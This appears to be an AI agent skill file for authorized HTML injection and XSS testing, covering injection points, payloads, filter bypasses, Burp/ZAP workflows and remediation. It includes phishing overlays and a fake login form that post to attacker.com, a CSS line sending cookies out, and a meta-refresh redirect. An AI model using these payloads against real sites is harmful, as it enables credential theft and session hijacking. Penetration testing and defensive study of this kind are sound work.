---
name: html-and-xss-injection-testing
description: Use this skill when testing for HTML injection and cross-site scripting (XSS) vulnerabilities in web applications, including identifying, exploiting, and remediating these security flaws.
---

# HTML and XSS Injection Testing

## Purpose

Identify and exploit HTML injection and cross-site scripting (XSS) vulnerabilities that allow attackers to inject malicious content into web applications. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors, facilitating the assessment of input sanitization and output encoding mechanisms.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- Tamper Data or similar proxy
- cURL for testing payloads

### Required Knowledge
- HTML fundamentals
- HTTP request/response structure
- Web application input handling
- Difference between HTML injection and XSS
- JavaScript execution in browser context

### Legal Prerequisites
- Written authorization for security testing
- Defined scope including target domains and features
- Agreement on handling of any captured session data
- Incident response procedures established

## Outputs and Deliverables

1. **Vulnerability Report** - Identified injection points with severity classifications
2. **Exploitation Proof** - Demonstrated content manipulation and session hijacking
3. **Impact Assessment** - Potential phishing and defacement risks
4. **Remediation Guidance** - Input validation and output encoding recommendations

## Core Workflow

### Phase 1: Understanding Injection Vulnerabilities

HTML injection occurs when user input is reflected in web pages without proper sanitization, allowing attackers to modify page appearance, create phishing pages, and steal user credentials through injected forms. Key differences from XSS include:
- HTML injection: Only HTML tags are rendered.
- XSS: JavaScript code is executed.

### Phase 2: Identifying Injection Points

Map application for potential injection surfaces:
```
1. Search bars and search results
2. Comment sections
3. User profile fields
4. Contact forms and feedback
5. Registration forms
6. URL parameters reflected on page
7. Error messages
8. Page titles and headers
9. Hidden form fields
10. Cookie values reflected on page
```

Common vulnerable parameters:
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### Phase 3: Basic Injection Testing

Test with simple HTML and JavaScript payloads:
```html
<!-- Basic HTML injection -->
<h1>Test Injection</h1>
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

Testing workflow:
```bash
# Test basic injection
curl "http://target.com/search?q=<h1>Test</h1>"

# Check if HTML renders in response
curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"

# Test in URL-encoded form
curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
```

### Phase 4: Types of Injection

#### Stored Injection
Payload persists in database:
```html
<!-- Profile bio injection -->
Name: John Doe
Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
     <h1>Site Under Maintenance</h1>
     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
     </div>
```

#### Reflected Injection
Payload in URL parameters:
```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1>
```

#### DOM-Based Injection
Payload processed by client-side JavaScript:
```javascript
// Dangerous sinks
document.write()
element.innerHTML
```

### Phase 5: Phishing Attack Construction

Create convincing phishing forms:
```html
<!-- Fake login form overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:50px;">
    <h2>Session Expired</h2>
    <form action="http://attacker.com/capture" method="POST">
        <label>Username:</label><br>
        <input type="text" name="username" style="width:200px;"><br><br>
        <label>Password:</label><br>
        <input type="password" name="password" style="width:200px;"><br><br>
        <input type="submit" value="Login">
    </form>
</div>
```

### Phase 6: Advanced Injection Techniques

#### CSS Injection
```html
<!-- Style injection -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
</style>
```

#### Meta Tag Injection
```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
```

### Phase 7: Bypass Techniques

Evade basic filters:
```html
<!-- Case variations -->
<H1>Test</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding variations -->
&#60;h1&#62;Encoded&#60;/h1&#62;
```

### Phase 8: Automated Testing

#### Using Burp Suite
```
1. Capture request with potential injection point
2. Send to Intruder
3. Mark parameter value as payload position
4. Load HTML injection wordlist
5. Start attack
6. Filter responses for rendered HTML
```

#### Using OWASP ZAP
```
1. Spider the target application
2. Active Scan with HTML injection rules
3. Review Alerts for injection findings
4. Validate findings manually
```

### Phase 9: Prevention and Remediation

Secure coding practices:
```php
// PHP: Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

Server-side protections:
- Input validation (whitelist allowed characters)
- Output encoding (context-aware escaping)
- Content Security Policy (CSP) headers

## Quick Reference

### Common Test Payloads

| Payload | Purpose |
|---------|---------|
| `<h1>Test</h1>` | Basic rendering test |
| `<script>alert(1)</script>` | XSS test |
| `<img src=x onerror=alert(1)>` | Image tag test |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<h1>test</h1>` |
| Form field | POST with HTML payload |

### Constraints and Limitations

### Attack Limitations
- Modern browsers may sanitize some injections
- CSP can prevent inline styles and scripts

### Testing Considerations
- Distinguish between HTML injection and XSS
- Verify visual impact in browser

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |